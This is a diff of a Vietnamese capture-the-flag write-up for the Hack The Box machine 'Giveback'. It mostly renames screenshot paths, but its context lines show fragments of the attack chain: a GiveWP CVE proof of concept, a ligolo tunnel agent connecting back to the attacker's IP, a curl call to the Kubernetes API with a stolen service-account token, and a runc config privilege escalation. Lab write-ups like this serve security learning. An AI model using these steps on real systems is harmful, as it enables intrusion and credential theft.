@@ -13,7 +13,7 @@ author: bumbi.203_
 
 Thực hiện scan Nmap. 
 
-![image](/assets/images/HTB/season9/Giveback/image%201.png)
+![image](/assets/images/HTB/season9/Giveback/image1.png)
 
 Kết quả scan Nmap
 
@@ -23,19 +23,19 @@ Mình add ip → **`/etc/host`**
 
 Sau đó mình truy cập qua trình duyệt. 
 
-![image](/assets/images/HTB/season9/Giveback/image%202.png)
+![image](/assets/images/HTB/season9/Giveback/image2.png)
 
 Giao diện web ban đầu
 
 Thì thử tìm mọi thứ liên quan đến web này bắt đầu từ file **`robots.txt`** trước. 
 
-![image](/assets/images/HTB/season9/Giveback/image%203.png)
+![image](/assets/images/HTB/season9/Giveback/image3.png)
 
 Truy cập file robots.txt 
 
 Nhìn thấy thì ko được truy cập **`/wp-admin`** mà cho phép **`/wp-admin/admin-ajax.php`** và một link sitemap.
 
-![image](/assets/images/HTB/season9/Giveback/image%204.png)
+![image](/assets/images/HTB/season9/Giveback/image4.png)
 
 Link XML Sitemap 
 
@@ -43,56 +43,56 @@ Thì mình đã lụm được 5 url và sẽ phải khám phá từng cái xem 
 
 - **`http://giveback.htb/wp-sitemap-posts-1.xml` ⇒ `http://giveback.htb/2024/09/hello-world`**
     
-    ![image](/assets/images/HTB/season9/Giveback/image%205.png)
+    ![image](/assets/images/HTB/season9/Giveback/image5.png)
     
     Truy cập mình được dẫn đến như sau.
     
-    ![image](/assets/images/HTB/season9/Giveback/image%206.png)
+    ![image](/assets/images/HTB/season9/Giveback/image6.png)
     
 - **`http://giveback.htb/wp-sitemap-posts-1.xml`** ⇒ 5 url khác.
     
-    ![image](/assets/images/HTB/season9/Giveback/image%207.png)
+    ![image](/assets/images/HTB/season9/Giveback/image7.png)
     
     - **`http://giveback.htb`** ⇒ trang web lúc đầu
     - **`http://giveback.htb/sample-page/`**
         
-        ![image](/assets/images/HTB/season9/Giveback/image%208.png)
+        ![image](/assets/images/HTB/season9/Giveback/image8.png)
         
     - **`http://giveback.htb/donation-confirmation`**
         
-        ![image](/assets/images/HTB/season9/Giveback/image%209.png)
+        ![image](/assets/images/HTB/season9/Giveback/image9.png)
         
     - **`http://giveback.htb/donation-failed/`**
         
-        ![image](/assets/images/HTB/season9/Giveback/image%2010.png)
+        ![image](/assets/images/HTB/season9/Giveback/image10.png)
         
     - **`http://giveback.htb/dornor-dashboard/`**
         
-        ![image](/assets/images/HTB/season9/Giveback/image%2011.png)
+        ![image](/assets/images/HTB/season9/Giveback/image11.png)
         
 - **`http://giveback.htb/wp-sitemap-posts-give_forms-1.xml` ⇒ `http://giveback.htb/the-things-we-need`**
     
-    ![image](/assets/images/HTB/season9/Giveback/image%2012.png)
+    ![image](/assets/images/HTB/season9/Giveback/image12.png)
     
     Truy cập được dẫn đến như sau. 
     
-    ![image](/assets/images/HTB/season9/Giveback/image%2013.png)
+    ![image](/assets/images/HTB/season9/Giveback/image13.png)
     
 - **`http://giveback.htb/wp-sitemap-taxonomies-category-1.xml` ⇒ `http://giveback.htb/category/uncategorized/`**
     
-    ![image](/assets/images/HTB/season9/Giveback/image%2014.png)
+    ![image](/assets/images/HTB/season9/Giveback/image14.png)
     
     Truy cập được dẫn đến. 
     
-    ![image](/assets/images/HTB/season9/Giveback/image%2015.png)
+    ![image](/assets/images/HTB/season9/Giveback/image15.png)
     
 - **`http://giveback.htb/wp-sitemap-users-1.xml` ⇒ `http://giveback.htb/author/user/`**
     
-    ![image](/assets/images/HTB/season9/Giveback/image%2016.png)
+    ![image](/assets/images/HTB/season9/Giveback/image16.png)
     
     Mình được dẫn tới đây. 
     
-    ![image](/assets/images/HTB/season9/Giveback/image%2017.png)
+    ![image](/assets/images/HTB/season9/Giveback/image17.png)
     
 
 Giờ thì mình phân tích và chú ý với những gì mình đã liệt kê ở trên.
@@ -101,26 +101,26 @@ Giờ thì mình phân tích và chú ý với những gì mình đã liệt kê
     
     Đây là trang cho phép người khác thực hiện donate. 
     
-    ![image](/assets/images/HTB/season9/Giveback/image%2018.png)
+    ![image](/assets/images/HTB/season9/Giveback/image18.png)
     
-    ![image](/assets/images/HTB/season9/Giveback/image%2019.png)
+    ![image](/assets/images/HTB/season9/Giveback/image19.png)
     
 
-![image](/assets/images/HTB/season9/Giveback/image%2020.png)
+![image](/assets/images/HTB/season9/Giveback/image20.png)
 
-![image](/assets/images/HTB/season9/Giveback/image%2021.png)
+![image](/assets/images/HTB/season9/Giveback/image21.png)
 
 Mình test thử chức năng donate → tui đã thử với 100$
 
-![image](/assets/images/HTB/season9/Giveback/image%2022.png)
+![image](/assets/images/HTB/season9/Giveback/image22.png)
 
 Sau khi đã donate thì mình để 1 link phía dưới **`Go to my Dashboard` →** sẽ được chuyển về **`Donor Dashboard`** 
 
-![image](/assets/images/HTB/season9/Giveback/image%2023.png)
+![image](/assets/images/HTB/season9/Giveback/image23.png)
 
 - **`http://giveback.htb/dornor-dashboard`**
     
-    ![image](/assets/images/HTB/season9/Giveback/image%2024.png)
+    ![image](/assets/images/HTB/season9/Giveback/image24.png)
     
     Mình cần cung cấp 1 email mà có thể sử dụng được, nhưng mà cũng thử dùng **`ho4ngphwc@ho4ngphwc.com`** xem nó response về gì. (Unable to send Email) 
     
@@ -128,9 +128,9 @@ Sau khi đã donate thì mình để 1 link phía dưới **`Go to my Dashboard`
     
 - **`http://giveback.htb/category/uncategorized/`**
     
-    ![image](/assets/images/HTB/season9/Giveback/image%2025.png)
+    ![image](/assets/images/HTB/season9/Giveback/image25.png)
     
-    ![image](/assets/images/HTB/season9/Giveback/image%2026.png)
+    ![image](/assets/images/HTB/season9/Giveback/image26.png)
     
     Khi mình trỏ tới **`admin-person`** → thì nó hiển thị **`wyrmlandia.org.nz.thing.edu`** 
     
@@ -453,7 +453,7 @@ Nhưng mà mình cần chú ý các kết quả sau:
 
 Mình cần check devtool xem có version hay ko? 
 
-![image](/assets/images/HTB/season9/Giveback/image%2027.png)
+![image](/assets/images/HTB/season9/Giveback/image27.png)
 
 Xác định web đang dùng plugin version **`3.14.0` → có thể liên quan đến 2 CVEs này.** 
 
@@ -479,7 +479,7 @@ Nhưng nhìn kết quả trả về thì khá nhiều trên các version mới, 
 
 Tổng quan về [CVE-2024-5941](https://www.wiz.io/vulnerability-database/cve/cve-2024-5941)
 
-![image](/assets/images/HTB/season9/Giveback/image%2028.png)
+![image](/assets/images/HTB/season9/Giveback/image28.png)
 
 Này nói về việc ko xác thực cho phép mình tiếp cận các file của người khác và xóa những file đó. → **có thể ko khai thác được.**
 
@@ -490,7 +490,7 @@ Này nói về việc ko xác thực cho phép mình tiếp cận các file củ
 Mình có các bài phân tích:
 
 - [**Link 1**](https://viblo.asia/p/phan-tich-cve-2024-5932-lo-hong-php-object-injection-trong-givewp-wordpress-plugin-x7Z4DOG0VnX)
-- [**Link 2**](https://www.skshieldus.com/download/files/download.do?o_fname=Research%20Technique_PHP%20Object%20Injection%20Vulnerability%20in%20WordPress%20GiveWP%20(CVE-2024-5932).pdf&r_fname=20240927174114070.pdf)
+- [**Link 2**](https://www.skshieldus.com/download/files/download.do?o_fname=Research Technique_PHP Object Injection Vulnerability in WordPress GiveWP (CVE-2024-5932).pdf&r_fname=20240927174114070.pdf)
 
 Đồng thời khi tìm kiếm trên mạng thì mình cũng tìm ra 1 POC: 
 
@@ -602,7 +602,7 @@ Và hostname nhìn thấy có thể là cách đặt tên trong Kubernetes, và 
 
 Và xác định chắc chắn hơn nữa vì tại icon của machine thì tác giả đã hint. 
 
-![image](/assets/images/HTB/season9/Giveback/image%2029.png)
+![image](/assets/images/HTB/season9/Giveback/image29.png)
 
 Thì đây được hiểu là **`Lightweight Kubernetes`** - [**k3s**](https://github.com/k3s-io/k3s).
 
@@ -987,21 +987,21 @@ Mình bắt đầu startup 1 server.
 **└─$ sudo ligolo-mp server -laddr 0.0.0.0:11601**
 ```
 
-![image](/assets/images/HTB/season9/Giveback/image%2030.png)
+![image](/assets/images/HTB/season9/Giveback/image30.png)
 
 Nó sẽ xuất hiện 1 interface, mình chỉ cần click **`Connect`** tới Admin
 
-![image](/assets/images/HTB/season9/Giveback/image%2031.png)
+![image](/assets/images/HTB/season9/Giveback/image31.png)
 
-![image](/assets/images/HTB/season9/Giveback/image%2032.png)
+![image](/assets/images/HTB/season9/Giveback/image32.png)
 
 Sau khi mình nhìn thấy, mình chọn **`Ctrl + N`** để tạo 1 agent để file này sẽ được upload qua **`penelope`** lên các session trên.
 
 Nhìn thấy nó tự tạo ra 1 file **`agent`** 
 
-![image](/assets/images/HTB/season9/Giveback/image%2033.png)
+![image](/assets/images/HTB/season9/Giveback/image33.png)
 
-![image](/assets/images/HTB/season9/Giveback/image%2034.png)
+![image](/assets/images/HTB/season9/Giveback/image34.png)
 
 Thì nó đã tạo ra thành công, giờ thì mình rename thành **`agent`** và quay lại session, đồng thời upload nó lên. 
 
@@ -1027,29 +1027,29 @@ mv agent-TQmaurmY agent
 <-7bdd4896bc-wnvwx:/opt/bitnami/wordpress/wp-admin$ ./agent -connect 10.10.16.72:11601 -ignore-cert**
 ```
 
-![image](/assets/images/HTB/season9/Giveback/image%2035.png)
+![image](/assets/images/HTB/season9/Giveback/image35.png)
 
 Nhìn thấy thì mình đã có connect về server của mình. 
 
 ⇒ tiếp theo mình sẽ add route tới **`10.43.2.0/24`** .
 
-![image](/assets/images/HTB/season9/Giveback/image%2036.png)
+![image](/assets/images/HTB/season9/Giveback/image36.png)
 
 Mình thêm các thông tin vào. 
 
-![image](/assets/images/HTB/season9/Giveback/image%2037.png)
+![image](/assets/images/HTB/season9/Giveback/image37.png)
 
 Sau đó mình chọn vào **`start relay`** 
 
-![image](/assets/images/HTB/season9/Giveback/image%2038.png)
+![image](/assets/images/HTB/season9/Giveback/image38.png)
 
 Mình thử ping vào mạng bên trong. 
 
-![image](/assets/images/HTB/season9/Giveback/image%2039.png)
+![image](/assets/images/HTB/season9/Giveback/image39.png)
 
 Giờ thì mình truy cập qua port `5000` 
 
-![image](/assets/images/HTB/season9/Giveback/image%2040.png)
+![image](/assets/images/HTB/season9/Giveback/image40.png)
 
 Thì mình thấy dòng **Developer Note → web chạy trên windows IIS và dùng php-cgi.exe** 
 
@@ -1137,15 +1137,15 @@ Tiếp theo thì mình sẽ triển 1 cái reverse shell qua **`curl`**
 ➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)**
 ```
 
-![image](/assets/images/HTB/season9/Giveback/image%2041.png)
+![image](/assets/images/HTB/season9/Giveback/image41.png)
 
 Quay lại tab penelope 
 
-![image](/assets/images/HTB/season9/Giveback/image%2042.png)
+![image](/assets/images/HTB/season9/Giveback/image42.png)
 
 Kiểm tra thì mình dược kết quả như sau
 
-![image](/assets/images/HTB/season9/Giveback/image%2043.png)
+![image](/assets/images/HTB/season9/Giveback/image43.png)
 
 Hiện tại mình đang là **`root`** bên trong internal service. 
 
@@ -1243,7 +1243,7 @@ Mình tìm kiếm docs và tìm ra [**access-api-from-pod**](https://kubernetes.
 
 Thử tìm kiếm xem sao.
 
-![image](/assets/images/HTB/season9/Giveback/image%2044.png)
+![image](/assets/images/HTB/season9/Giveback/image44.png)
 
 > Theo document thì mỗi pod có service account được mount tại **`/var/run/secrets/kubernetes.io/serviceaccount`**
 > 
@@ -1819,15 +1819,15 @@ curl -sk -H "Authorization: Bearer $TOKEN" https://10.43.0.1:443/api/v1/namespac
 
 Mình có được 1 masterpass nhưng mà nó bị encode base64. Nên là mình decode nó. 
 
-![image](/assets/images/HTB/season9/Giveback/image%2045.png)
+![image](/assets/images/HTB/season9/Giveback/image45.png)
 
 Từ đây mình vào ssh như đã scan port lúc trên
 
-![image](/assets/images/HTB/season9/Giveback/image%2046.png)
+![image](/assets/images/HTB/season9/Giveback/image46.png)
 
 Từ đây mình khám phá trên user này.
 
-![image](/assets/images/HTB/season9/Giveback/image%2047.png)
+![image](/assets/images/HTB/season9/Giveback/image47.png)
 
 ## Inital Access
 
@@ -1837,11 +1837,11 @@ Mình đã có được user vào bằng ssh là **`babywyrm`** xem thử nó c�
 
 ### Discovery
 
-![image](/assets/images/HTB/season9/Giveback/image%2048.png)
+![image](/assets/images/HTB/season9/Giveback/image48.png)
 
 Thấy **`/opt/debug`** chạy được → nên chạy thử.
 
-![image](/assets/images/HTB/season9/Giveback/image%2049.png)
+![image](/assets/images/HTB/season9/Giveback/image49.png)
 
 Nhưng nó bắt mình phải nhập thêm pass của **`administrative`** 
 
@@ -1875,7 +1875,7 @@ define( 'DB_CHARSET', 'utf8' );
 define( 'DB_COLLATE', '' );**
 ```
 
-![image](/assets/images/HTB/season9/Giveback/image%2050.png)
+![image](/assets/images/HTB/season9/Giveback/image50.png)
 
 Giờ thì mình chạy lại. 
 
@@ -1956,7 +1956,7 @@ Runc giồng như container-runtime chứa cấp thấp và cũng triển khai O
 
 → đọc thử file config.
 
-![image](/assets/images/HTB/season9/Giveback/image%2051.png)
+![image](/assets/images/HTB/season9/Giveback/image51.png)
 
 ```bash
 **babywyrm@giveback:~$ cat config.json
@@ -2173,6 +2173,6 @@ babywyrm@giveback:~/root$ cat > config.json << 'EOF'
 
 Giờ mình thì chạy **`sudo /opt/debug`** 1 lần nữa trong **`/root`** nó sẽ kích hoạt suid và mình sẽ leo lên root.
 
-![image](/assets/images/HTB/season9/Giveback/image%2052.png)
+![image](/assets/images/HTB/season9/Giveback/image52.png)
 
-![image](/assets/images/HTB/season9/Giveback/image%2053.png)
+![image](/assets/images/HTB/season9/Giveback/image53.png)
